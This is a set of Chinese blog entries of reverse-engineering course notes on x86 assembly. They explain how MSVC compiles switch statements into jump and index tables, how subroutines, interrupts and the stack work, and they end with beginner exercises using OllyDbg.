<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_a$ = 8 	; size = 4</span><br><span class="line">_f 		PROC</span><br><span class="line">	mov eax, DWORD PTR _a$[esp-4]</span><br><span class="line">	sub eax, 0</span><br><span class="line">	je SHORT $LN4@f</span><br><span class="line">	sub eax, 1</span><br><span class="line">	je SHORT $LN3@f</span><br><span class="line">	sub eax, 1</span><br><span class="line">	je SHORT $LN2@f</span><br><span class="line">	mov DWORD PTR _a$[esp-4], OFFSET $SG791 	; &#x27;sth unknown&#x27;, 0aH, 00H </span><br><span class="line">	jmp _printf</span><br><span class="line">$LN2@f:</span><br><span class="line">	mov DWORD PTR _a$[esp-4], OFFSET $SG789 ; &#x27;two&#x27;, 0aH, 00H </span><br><span class="line">	jmp _printf</span><br><span class="line">$LN3@f:</span><br><span class="line">		mov DWORD PTR _a$[esp-4], OFFSET $SG787 ; &#x27;one&#x27;, 0aH, 00H </span><br><span class="line">	jmp _printf</span><br><span class="line">$LN4@f:</span><br><span class="line">		mov DWORD PTR _a$[esp-4], OFFSET $SG785 ; &#x27;zero&#x27;, 0aH, 00H </span><br><span class="line">	jmp _printf</span><br><span class="line">_f		ENDP</span><br></pre></td></tr></table></figure>
<p>我们看到，它有以下两处不同。</p>
<ol>
<li>程序把变量 a 存储到 EAX 寄存器之后，又用 EAX 的值减去零。似乎这样做并没有什么道理。但是 这两条指令可以检查 EAX 寄存器的值是否是零。如果 EAX 寄存器的值是零，<code>ZF 标志寄</code>存器会被置 1(也就是说 0−0&#x3D;0，这就可以提前设置 ZF 标志位)，并会触发第一条条件转移指令 JE，使程序跳转到 $LN4@f，继而在屏幕 上打印<code>Zero</code>。如果 EAX 寄存器的值仍然不是零，则不会触发第一条跳转指令、做<code>EAX=EAX-1</code>的运算， 若计算结果是零则做相应输出;若此时 EAX 寄存器的值仍然不是零，就会再做一次这种减法操作和条件判断。<br>  如果三次运算都没能使 EAX 寄存器的值变为零，那么程序会输出最后一条信息<code>something unknown</code>。</li>
<li>在把字符串指针存储到变量 a 之后，函数使用 <code>JMP</code> 指令调用 <code>printf()</code>函数。在调用 printf()函 数的时候，调用方函数而没有使用常规的 <code>call</code> 指令。这点不难解释:调用方函数把参数推送入栈之后，的确通常通过 CALL 指令调用其他函数。这种情况下，<code>CALL 指令会把返回地址推送入栈、并通过无条件转移的手段启用被调用方函数</code>。就本例而言，在被调用方函数运行的任意时刻，栈的内存存储结构为:</li>
</ol>
<ul>
<li>ESP——指向 RA。</li>
<li>ESP+4——指向变量 a。</li>
</ul>
<p>这个程序把函数的第一个参数替换为字符串的指针，然后跳转到 printf()函数的地址，就好像程序没有 <code>调用</code>过 <code>f()</code>函数、直接<code>转移</code>了 <code>printf()</code>函数一般。当 printf()函数完成输出的使命以后，它会执行 RET 返回指令。RET 指令会从栈中读取(POP)返回地址<code> RA</code>、并跳转到 RA。不过这个 RA 不是其调用方函数—— f()函数内的某个地址，而是调用 f()函数的函数即 <code>main()</code>函数的某个地址。换而言之，跳转到这个 RA 地址后，printf()函数会伴随其调用方函数 f()一同结束。<br>除非每个case从句的最后一条指令都是调用printf()函数，否则编译器就做不到这种程度的优化。某种意义上说这与<code>longjmp()函数</code> 十分相似。当然，这种优化的目的无非就是提高程序的运行速度。</p>
<h3 id="ARM-x2F-MIPS"><a href="#ARM-x2F-MIPS" class="headerlink" title="ARM&#x2F;MIPS"></a>ARM&#x2F;MIPS</h3><p>请参考《RE4B》对应篇章。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在case分支较少的情况下，<code>switch()</code>和<code>if/else</code>语句的编译结果基本相同。</p>
<h2 id="case陈述式较多的情况"><a href="#case陈述式较多的情况" class="headerlink" title="case陈述式较多的情况"></a>case陈述式较多的情况</h2><p>在 switch()语句存在大量case()分支的情况下，编译器就不能直接套用大量<code>JE/JNE</code>指令了。否则程序代码肯定会非常庞大。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void f (int a)</span><br><span class="line">&#123;</span><br><span class="line">	switch (a)</span><br><span class="line">	&#123;</span><br><span class="line">		case 0: printf (&quot;zero\n&quot;); break;</span><br><span class="line">		case 1: printf (&quot;one\n&quot;); break;</span><br><span class="line">		case 2: printf (&quot;two\n&quot;); break;</span><br><span class="line">		case 3: printf (&quot;three\n&quot;); break;</span><br><span class="line">		case 4: printf (&quot;four\n&quot;); break;</span><br><span class="line">		default: printf (&quot;something unknown\n&quot;); break;</span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123; </span><br><span class="line">	f(2); // test </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h3><h4 id="未优化的MSVC-1"><a href="#未优化的MSVC-1" class="headerlink" title="未优化的MSVC"></a>未优化的MSVC</h4><p>在MSVC上编译的指令清单如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tv64 = -4 ; size=4 </span><br><span class="line">_a$ = 8 ;size=4</span><br><span class="line">_f		 PROC</span><br><span class="line">		push ebp</span><br><span class="line">		mov ebp, esp</span><br><span class="line">		push ecx</span><br><span class="line">		mov eax, DWORD PTR _a$[ebp]</span><br><span class="line">		mov DWORD PTR tv64[ebp], eax</span><br><span class="line">		cmp DWORD PTR tv64[ebp], 4</span><br><span class="line">		ja SHORT $LN1@f</span><br><span class="line">		mov ecx, DWORD PTR tv64[ebp]</span><br><span class="line">		jmp DWORD PTR $LN11@f[ecx*4]</span><br><span class="line">$LN6@f:</span><br><span class="line">		push OFFSET $SG739 ; &#x27;zero&#x27;, 0aH, 00H</span><br><span class="line">		call _printf</span><br><span class="line">		add esp, 4</span><br><span class="line">		jmp SHORT $LN9@f</span><br><span class="line">$LN5@f:</span><br><span class="line">		push OFFSET $SG741 ; &#x27;one&#x27;, 0aH, 00H</span><br><span class="line">		call _printf</span><br><span class="line">		add esp, 4</span><br><span class="line">		jmp SHORT $LN9@f</span><br><span class="line">$LN4@f:</span><br><span class="line">		push OFFSET $SG743 ; &#x27;two&#x27;, 0aH, 00H</span><br><span class="line">		call _printf</span><br><span class="line">		add esp, 4</span><br><span class="line">		jmp SHORT $LN9@f</span><br><span class="line">$LN3@f:</span><br><span class="line">		push OFFSET $SG745 ; &#x27;three&#x27;, 0aH, 00H</span><br><span class="line">		call _printf</span><br><span class="line">		add esp, 4</span><br><span class="line">		jmp SHORT $LN9@f</span><br><span class="line">$LN2@f:</span><br><span class="line">		push OFFSET $SG747 ; &#x27;four&#x27;, 0aH, 00H</span><br><span class="line">		call _printf</span><br><span class="line">		add esp, 4</span><br><span class="line">		jmp SHORT $LN9@f</span><br><span class="line">$LN1@f:</span><br><span class="line">		push OFFSET $SG749 ; &#x27;something unknown&#x27;, 0aH, 00H</span><br><span class="line">		call _printf</span><br><span class="line">		add esp, 4</span><br><span class="line">$LN9@f:</span><br><span class="line">		mov esp, ebp</span><br><span class="line">		pop ebp</span><br><span class="line">		ret 0</span><br><span class="line">		npad 2		;align next lable</span><br><span class="line">$LN11@f:</span><br><span class="line">		DD $LN6@f 	; 0</span><br><span class="line">		DD $LN5@f 	; 1</span><br><span class="line">		DD $LN4@f 	; 2</span><br><span class="line">		DD $LN3@f 	; 3</span><br><span class="line">		DD $LN2@f 	; 4</span><br><span class="line">_f		ENDP</span><br></pre></td></tr></table></figure>
<p>这段代码可被分为数个调用printf()函数的<code>指令组</code>，而且每组指令传递给printf()函数的参数还各不相 同。这些指令组在内存中拥有各自的起始地址，也就被编译器分配到了不同的符号标签(symbolic label) 之后。总的来看，程序通过<code>$LN11@f </code>处的一组数据调派这些符号标签。</p>
<p>函数最初把变量<code>a</code>的值与数字<code>4</code>进行比较。如果 a 大于 4，函数则跳转到<code>$LN1@f </code>处，把字符串<code>something unknown</code>的指针传递给 printf()函数。</p>
<p>如果变量 a 小于或等于 4，则会计算<code>a 乘以 4</code>的积，再计算积与<code>$LN11@f </code>的偏移量的<code>和(表查询)</code>， 并跳转到这个结果所指向的地址上。<br>以变量 a 等于 2 的情况来说，2×4&#x3D;<code>8</code>(由于 x86 系统的内存地址都是 32 位数据，所以$LN11@f 表中的每个地址都占用 4 字节)。在计算<code>8</code>与<code>$LN11@f </code>的偏移量的和之后，再跳转到这个和指向的标签——即<code>$LN4@f </code>处。JMP 指令最终跳转到<code>$LN4@f </code>的地址。</p>
<p><code>$LN11@f</code>标签(偏移量)开始的表，叫作<code>转移表jumptable</code>，也叫作<code>转移(输出)表branchtable</code>。<br>当 a 等于 2 的时候，程序分配给 printf()的参数是<code>two</code>。实际上，此时的 switch 语句的分支指令等效于<code>jmp DWORD PTR $LN11@f[ecx*4]</code>。它会进行间接取值的操作，把指针<code>PTR&#123;表达式&#125;</code>所指向的数据读取出来，当作 DWORD 型数据传递给 JMP 指令。在这个程序里，表达式的值为 <code>$LN11@f+ecx*4</code>。</p>
<p>此后出现的<code>npad</code>指令属于<code>汇编宏</code>。它的作用是把紧接其后的标签地址<code>向 4 字节(或 16 字节)边界对齐</code>。npad 的地址对齐功能可提高处理器的 IO 读写效率，通过一次操作即可完成内存总线、缓冲内存等设备的数据操作。</p>
<h4 id="开启优化的MSVC"><a href="#开启优化的MSVC" class="headerlink" title="开启优化的MSVC"></a>开启优化的MSVC</h4><p>请参考《RE4B》对应章节。此处省略，因为编译出来的代码几乎相同，只是用<code>左移</code>操作来做乘法。</p>
<h4 id="ARM-x2F-MIPS-1"><a href="#ARM-x2F-MIPS-1" class="headerlink" title="ARM&#x2F;MIPS"></a>ARM&#x2F;MIPS</h4><p>请参考《RE4B》对应章节。</p>
<h2 id="case从句多对一的情况"><a href="#case从句多对一的情况" class="headerlink" title="case从句多对一的情况"></a>case从句多对一的情况</h2><p>考虑如下程序：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void f (int a)</span><br><span class="line">&#123;</span><br><span class="line">	switch (a)</span><br><span class="line">	&#123;</span><br><span class="line">		case 1: </span><br><span class="line">		case 2: </span><br><span class="line">		case 7:</span><br><span class="line">		case 10:printf (&quot;1, 2, 7, 10\n&quot;);</span><br><span class="line">				break; </span><br><span class="line">		case 3:</span><br><span class="line">		case 4:</span><br><span class="line">		case 5:</span><br><span class="line">		case 6:printf (&quot;3, 4, 5\n&quot;);</span><br><span class="line">				break;</span><br><span class="line">		case 8: </span><br><span class="line">		case 9:</span><br><span class="line">		case 20:</span><br><span class="line">		case 21:printf (&quot;8 9, 21\n&quot;); </span><br><span class="line">				break;</span><br><span class="line">		case 22:printf (&quot;22\n&quot;); </span><br><span class="line">				break;</span><br><span class="line">		default:printf (&quot;default\n&quot;);</span><br><span class="line">		break; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">	f(4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般而言，编译器会通过某种<code>派发机制</code>来降低代码的冗余度。</p>
<h3 id="MSVC"><a href="#MSVC" class="headerlink" title="MSVC"></a>MSVC</h3><p>指令清单如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SG2798 DB &#x27;1, 2, 7, 10&#x27;, 0aH, 00H</span><br><span class="line">$SG2800 DB &#x27;3, 4, 5&#x27;, 0aH, 00H</span><br><span class="line">$SG2802 DB &#x27;8, 9, 21&#x27;, 0aH, 00H</span><br><span class="line">$SG2804 DB &#x27;22&#x27;, 0aH, 00H</span><br><span class="line">$SG2806 DB &#x27;default&#x27;, 0aH, 00H</span><br><span class="line"></span><br><span class="line">_ a $ = 8</span><br><span class="line">_f 		PROC</span><br><span class="line">		mov eax, DWORD PTR _a$[esp-4] </span><br><span class="line">		dec eax</span><br><span class="line">		cmp eax, 21</span><br><span class="line">		ja SHORT $LN1@f</span><br><span class="line">		movzx eax, BYTE PTR $LN10@f[eax] </span><br><span class="line">		jmp DWORD PTR $LN11@f[eax*4]</span><br><span class="line">$LN5@f:</span><br><span class="line">		mov DWORD PTR _a$[esp-4], OFFSET $SG2798 ; &#x27;1, 2, 7, 10&#x27; </span><br><span class="line">		jmp DWORD PTR __imp__printf</span><br><span class="line">$LN4@f:</span><br><span class="line">		mov DWORD PTR _a$[esp-4], OFFSET $SG2800 ; &#x27;3, 4, 5&#x27; </span><br><span class="line">		jmp DWORD PTR __imp__printf</span><br><span class="line">$LN3@f:</span><br><span class="line">		mov DWORD PTR _a$[esp-4], OFFSET $SG2802 ; &#x27;8, 9, 21&#x27; </span><br><span class="line">		jmp DWORD PTR __imp__printf</span><br><span class="line">$LN2@f:</span><br><span class="line">		mov DWORD PTR _a$[esp-4], OFFSET $SG2804 ; &#x27;22&#x27; </span><br><span class="line">		jmp DWORD PTR __imp__printf</span><br><span class="line">$LN1@f:</span><br><span class="line">		mov DWORD PTR _a$[esp-4], OFFSET $SG2806 ; &#x27;default&#x27;</span><br><span class="line">		jmp DWORD PTR __imp__printf</span><br><span class="line">		npad 2 ; align $LN11@f table on 16-byte boundary</span><br><span class="line">$LN11@f:</span><br><span class="line">		DD $LN5@f ; print &#x27;1, 2, 7, 10&#x27;</span><br><span class="line">		DD $LN4@f ; print &#x27;3, 4, 5&#x27;</span><br><span class="line">		DD $LN3@f ; print &#x27;8, 9, 21&#x27;</span><br><span class="line">		DD $LN2@f ; print &#x27;22&#x27;</span><br><span class="line">		DD $LN1@f ; print &#x27;default&#x27;</span><br><span class="line">$LN10@f:</span><br><span class="line">		DB 0	;a=1 </span><br><span class="line">		DB 0	;a=2 </span><br><span class="line">		DB 1	;a=3 </span><br><span class="line">		DB 1	;a=4 </span><br><span class="line">		DB 1	;a=5 </span><br><span class="line">		DB 1	;a=6 </span><br><span class="line">		DB 0	;a=7 </span><br><span class="line">		DB 2	;a=8 </span><br><span class="line">		DB 2	;a=9 </span><br><span class="line">		DB 0	;a=10 </span><br><span class="line">		DB 4	;a=11 </span><br><span class="line">		DB 4	;a=12 </span><br><span class="line">		DB 4	;a=13 </span><br><span class="line">		DB 4	;a=14 </span><br><span class="line">		DB 4	;a=15 </span><br><span class="line">		DB 4	;a=16 </span><br><span class="line">		DB 4	;a=17 </span><br><span class="line">		DB 4	;a=18 </span><br><span class="line">		DB 4	;a=19 </span><br><span class="line">		DB 2	;a=20 </span><br><span class="line">		DB 2	;a=21 </span><br><span class="line">		DB 3	;a=22</span><br><span class="line">_f		ENDP</span><br></pre></td></tr></table></figure>
<p>这个程序用到了两个表:一个是<code>索引表</code>$LN10@f;另一个是<code>转移表</code>$LN11@f。<br>第 13 行的<code>movzx</code>指令在索引表里查询输入值。<br>索引表的返回值又分为 0(输入值为 1、2、7、10)、1(输入值为 3、4、5)、2(输入值为 8、9、21)、3(输入值为 22)、4(其他值)这 5 种情况。<br>程序把索引表的返回值作为关键字，再在第二个转移表里进行查询，以完成相应跳转(第 14 行指令的作用)。<br>需要注意的是，输入值为 0 的情况没有相应的 case 从句。如果 a&#x3D;0，则“dec eax”指令会继续进行计算，而$LN10@f 表的查询是从 1 开始的。可见，没有必要为 0 的特例设置单独的表。<br>在这种双表结构中，索引表采用的是<code>byte</code>型数据，所以双表结构比前面那种单表结构更为紧凑。</p>
<h2 id="Fall-through"><a href="#Fall-through" class="headerlink" title="Fall-through"></a>Fall-through</h2>]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程——汇编基础（五）</title>
    <url>/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%94%EF%BC%89.html</url>
    <content><![CDATA[<h2 id="子程序"><a href="#子程序" class="headerlink" title="子程序"></a>子程序</h2><p>在汇编语言中，无门并不能像高级语言中那样，在不和程序其他部分起冲突的情况下，定义和其他主程序或子程序一样的变量名。<br>汇编语言并不注重程序员的负担，它依赖程序员的良好设计，以期发挥CPU的最佳性能。<br>汇编语言不是结构化的语言，它不提供直接的“局部变量”。如果需要，只能<code>通过堆或栈自行实现</code>。</p>
<p>参数的传递是靠<code>寄存器</code>或<code>堆栈</code>来完成的。高级语言中，子程序（函数／过程，或者类似概念的东西）依赖于堆和栈来传递。</p>
<h3 id="子程序的执行过程"><a href="#子程序的执行过程" class="headerlink" title="子程序的执行过程"></a>子程序的执行过程</h3><p>无论是C／C++／BASIC／Pascal，子程序的执行过程基本都是一致的。</p>
<ul>
<li>调用者将子程序执行完成时应返回的地址／参数压入堆栈。</li>
<li>子程序使用<code>BP指针+偏移量</code>对栈中的参数<code>寻址</code>，并取出，完成操作。</li>
<li>子程序使用<code>RET</code>或<code>RETF</code>指令返回。此时，CPU将<code>IP</code>置为堆栈中保存的地址，并继续予以执行。</li>
</ul>
<p>毋庸置疑，堆栈在整个过程中发挥着非常重要的作用。不过，本质上对子程序最重要的还是<code>返回地址</code>，如果子程序不知道这个地址，那么系统将会崩溃。<br>调用子程序的指令是<code>CALL</code>，对应的返回指令是<code>RET</code>，另外还有<code>ENTER</code>和<code>LEAVE</code>，她们可以帮助进行堆栈的维护。</p>
<p><code>CALL</code>指令的参数是<code>被调用子程序的地址</code>。使用宏汇编的时候，这通常是一个标号。CALL和RET，一级ENTER和LEAVE配对，以实现<code>对堆栈的自动操作</code>，而不需要程序员进行PUSH&#x2F;POP，以及跳转的操作，从而提高了效率。</p>
<blockquote>
<p>下面一段程序，是从作者文档中抄下来的，我搭建环境并且编译之后，并没有得到相同的汇编代码，所以大家不用拘泥于下面的细节，但是可以从原作者的分析中得到一些有用的知识。</p>
</blockquote>
<p>程序是这样的：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">myTransform</span><span class="params">(<span class="type">int</span> nInput)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (nInput*<span class="number">2</span>+<span class="number">3</span>) %<span class="number">7</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> a[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">register</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    a[i] = <span class="built_in">myTransform</span>(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作者编译出来，并且合并了C++代码和汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int myTransform(int nInput)&#123;</span><br><span class="line">//00401000 push ebp		;保护现场原先的EBP指针</span><br><span class="line">//00401001 mov ebp,esp</span><br><span class="line">return (nInput*2+3)%7;</span><br><span class="line">//00401003 mov eax,dword ptr [nInput]		;取参数</span><br><span class="line">//00401006 lea eax,[eax+eax+3]		;LEA比ADD加法更快</span><br><span class="line">//0040100A cdq		;DWORD -&gt; QWORD（扩展字长）</span><br><span class="line">//0040100B mov ecx,7		;除数</span><br><span class="line">//00401010 idiv eax,ecx		;除</span><br><span class="line">//00401012 mov eax,edx		;商-&gt;eax（eax中保存返回值）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//00401014 pop ebp		;恢复现场的EBP指针</span><br><span class="line">//00401005 ret		;返回</span><br><span class="line"></span><br><span class="line">//; 此处删除10条int 3指令，不会影响程序行为</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">//00401020 push ebp		;保护现场原先的EBP指针</span><br><span class="line">//00401021 mov ebp,esp</span><br><span class="line">//00401023 sub esp,10h		;为取argc/argv修正堆栈指针</span><br><span class="line"></span><br><span class="line">int a[3];</span><br><span class="line">for(register int i=0;i&lt;3;i++)&#123;</span><br><span class="line">	//00401026 mov dword ptr [i],0		;0-&gt;i</span><br><span class="line">	//0040102D jmp main+18h(00401038)		;判断循环条件</span><br><span class="line">	//0040102F mov eax,dword ptr [i]		;i-&gt;eax</span><br><span class="line">	//00401032 add eax,1		;EAX++</span><br><span class="line">	//00401035 mov dword ptr [i],eax		;eax -&gt; i</span><br><span class="line">	//00401038 cmp dword ptr [i],3; 循环条件：i与3比较</span><br><span class="line">	//0040103C jge main+33h(00401053)		;如果不符合条件，则应结束循环</span><br><span class="line">	a[i] = myTransform[i];</span><br><span class="line">	//0040103E mov ecx,dword ptr [i]		;i-&gt;ECX</span><br><span class="line">	//00401041 push ecx		;ecx(i) -&gt; 堆栈</span><br><span class="line">	//00401042 call myTransform(00401000)		;调用myTransform</span><br><span class="line">	//00401047 add esp,4		;ESP+4:在堆中的新单元</span><br><span class="line"></span><br><span class="line">	//;准备存放返回结果</span><br><span class="line">	//0040104A mov edx,dword ptr [i]		;i-&gt;EDX</span><br><span class="line">	//0040104D mov dword ptr [edx*4],eax		;将EAX(即myTransform的返回值)放回a[i]</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//00401051 jmp main+0Fh(0040102F)		;计算出i++，并继续循环</span><br><span class="line">return 0;</span><br><span class="line">//00401053 xor eax,eax		;返回值应该是0</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//00401055 mov esp,ebp		;恢复堆栈指针</span><br><span class="line">//00401057 pop ebp		;恢复BP</span><br><span class="line">//00401058 ret		;返回调用者(C++运行环境)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401003 mov eax,dword ptr [nInput]		;取参数</span><br></pre></td></tr></table></figure>
<p>这句话在另外一个反汇编器得到的结果是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401003 mov eax,dword ptr [ebp+8]		;取参数</span><br></pre></td></tr></table></figure>
<p>剖析上面的程序只是说明了前面所提到的子程序的一部分用法。对于汇编语言来说，完全没有必要拘泥于结构化程序设计的框架。</p>
<h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><p>中断应该说是一个陈旧的话题。这新的系统中，它的作用正在逐渐被削弱，而变成操作系统专用的东西。并不是所有的计算机系统都提供中断，然而这x86系统中，它的作用是不可替代的。</p>
<p>中断实际上是一类特殊的子程序。它通常<code>由系统调用</code>，以响应突发事件。</p>
<p>例如，进行磁盘操作时，为了提高性能，可能会使用DMA方式进行操作。CPU向DMA控制器发出指令，要求外设和内存直接交换数据，而不通过CPU。然后，CPU转去进行其他的操作；当数据交换结束时，CPU可能需要进行一些后续操作，但此时它如何才能知道DMA已经完成了操作呢？</p>
<p>很显然不是依靠CPU去查询状态——这样DMA的优势就不明显了。为了尽可能地利用DMA的优势，这完成DMA操作的时候，DMA会告诉CPU“这事儿我办完了”，然后CPU会根据需要进行处理。</p>
<p>这种处理可能很复杂，需要若干条指令来完成。子程序是一个不错的主意，不过，CALL指令需要指定地址，让外设强迫CPU执行一条CALL指令也违背了CPU作为核心控制单元的设计初衷。考虑到这些，这x86系统中引入了<code>中断向量</code>的概念。</p>
<p><code>中断向量表</code>是保存在系统数据区（实模式下，是0:0开始的一段区域）的一组指针。这组指针指向每个中断服务程序的地址。整个中断向量表的结构是一个线性表。</p>
<p>每个中断服务都有自己的唯一编号，我们通常称之为<code>中断号</code>。每一个中断号对应中断向量表中的一项，也就是一个中断的向量。外设向驼背发出中断请求，而CPU自己将根据当前的程序状态决定是否中断当前程序并调用相应的中断服务。</p>
<p>不难根据造成中断的原因将中断分为两类：<code>硬件中断</code>和<code>软件中断</code>。硬件中断有很多分类方法，如根据是否可以屏蔽分类、根据优先级高低分类，等等。考虑到这些分类并不一定科学，并且对于我们介绍中断的使用没有太大的帮助，因此我们并不打算太详细地介绍它。</p>
<p>在设计操作系统时，中断向量的概念曾经带来过很大的便利。操作系统随时可能升级，这样，通过CALL来调用操作系统的服务（如果说每个程序都包含对于文件系统、进程表这些应该由操作系统管理的数据的直接操作的话，不仅会造成程序的臃肿，而且不利于系统的安全）就显得不太合适了——没人知道以后的操作系统的服务程序入口点会不会是那。软件中断的存在为解决这个问题提供了方便。</p>
<p>对于一台包含了BIOS的计算机来说，启动的时候系统已经提供了一部分服务，例如显示服务。无论你的BIOS、显卡有多么的“个性”，只要他们和IBM PC 兼容，那么此时你肯定可以通过调用<code>16(10h)号</code>中断来使用显示服务。调用中断的指令是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int 中断号</span><br></pre></td></tr></table></figure>
<p>这将引发CPU去调用一个中断。CPU将保存当前的程序状态字，清除Trap和Interrupt两个标志，将即将执行的指令地上压入堆栈，并调用中断服务（根据中断向量表）。</p>
<p>编写中断服务程序不是一件容易的事情。很多时候，中断服务程序必须写成<code>可重入代码</code>（或纯代码，pure code）。所谓可重入代码是指，程序的运行过程中可以被打断，并由开始处再次执行，并且执行结果不受影响。</p>
<p>由于在多线程环境中等其他一些地方进行程序设计时也需要考虑这个因素，因此这里着重说一个可重入代码的编写。</p>
<p>可重入代码<code>最主要的要求</code>就是，程序不应使用某个指定的内存地址的内存（对于高级语言来说，这通常是全局变量，或对象的成员）。如果可能的话，应使用寄存器，或其他方式来解决。如果不能做到这一点，则必须在开始、结束的时候分别禁止和启用中断，并且，运行时间不能太长。</p>
<p>调用软件中断时，通常都是通过寄存器传进、传出参数。这意味着你的int指令周围也许会存在一些“帮手”，比如下面的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>
<p>就是通过调用DOS中断服务返回父进程，并带回错误找反馈码0。其中，ax中的数据4c00h就是传递给DOS中断服务的参数。</p>
<p>到此，x86汇编语言的基础部分就讲完了。</p>
<p>在以后的课程中，我们将学习另一本书，叫做《RE4B》。</p>
<h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><ol>
<li>在GitHub的Issue里面有一个关于逆向工程的虚拟机环境，有下载链接，请准备好。</li>
<li>熟悉上面的程序与汇编的对应。</li>
<li>学习笔记。</li>
</ol>
]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程——汇编基础（四）</title>
    <url>/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol>
<li><p>堆栈是一个先进后出（FILO）的线性表<br>  <code>FILO</code>是指：<code>最后</code>放进表中的数据在<code>取出</code>时，<code>最先</code>出来，即 Fist in Last Out。<br>  <img src="/images/60108094ba47d6ce8998f695549e24556fa9b08f.png" alt="3rd_1.png"></p>
</li>
<li><p>系统堆栈不仅仅是一段内存。<br>  由于CPU对它实施管理，因此你不需要考虑堆栈指针的修正问题。可以把寄存器内容，甚至一个立即数直接放入堆栈里，并在需要的时候将其取出。同时，系统并不要求取出的数据任然回到原来的位置。</p>
</li>
</ol>
<h3 id="堆栈相关指令"><a href="#堆栈相关指令" class="headerlink" title="堆栈相关指令"></a>堆栈相关指令</h3><p>除了显示地操作堆栈（使用<code>push</code>和<code>pop</code>指令）之外，很多指令也需要使用堆栈，如<code>INT</code>、<code>CALL</code>、<code>LEAVE</code>、<code>RET</code>、<code>RETE</code>、<code>IRET</code>等等。配对使用上述指令并不会造成什么问题，然而，如果你打算使用LEAVE、RET、RETE、IRET这样的指令实现跳转（比JMP更为麻烦，然而有时，例如在加密软件中，或者需要修改调用者状态时这是必要的）的话，那么要搞清楚他们做的到底是什么，并且精确而了解自己要做什么。</p>
<h4 id="push-x2F-pop指令"><a href="#push-x2F-pop指令" class="headerlink" title="push&#x2F;pop指令"></a>push&#x2F;pop指令</h4><p><code>push 寄存器</code>：将一个寄存器中的数据<code>压入</code>堆栈；<br><code>pop 寄存器</code>：将<code>栈顶</code>的数据<code>弹出</code>堆栈，并传入指定的寄存器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ax			;将ax中的数据入栈</span><br><span class="line">pop ax			;将堆栈栈顶的数据弹出并传送给ax</span><br></pre></td></tr></table></figure>
<p><code>push 段寄存器</code>：将一个段寄存器中的数据压入堆栈；<br><code>pop 段寄存器</code>：将栈顶表示的数据弹出，并传入端寄存器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ds</span><br><span class="line">pop ds</span><br></pre></td></tr></table></figure>
<p><code>push 内存单元</code>：将一个内存单元处的数据压入堆栈；<br><code>pop 内存单元</code>：将栈顶表示的数据弹出，并传入内存单元。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push [0]			;将DS:[0]的数据压入堆栈</span><br><span class="line">pop [0]			;将栈顶数据弹出，并传入DS:[0]</span><br></pre></td></tr></table></figure>
<p>8086CPU的入栈和出栈都是以<code>字</code>为单元的。</p>
<h3 id="简单实践"><a href="#简单实践" class="headerlink" title="简单实践"></a>简单实践</h3><blockquote>
<p>请各位同学自行下载<code>OllyDBG</code>，然后用OD随便打开一个程序，比如notepad.exe，然后鼠标滚动反汇编窗口，直到遇到空的地方。</p>
</blockquote>
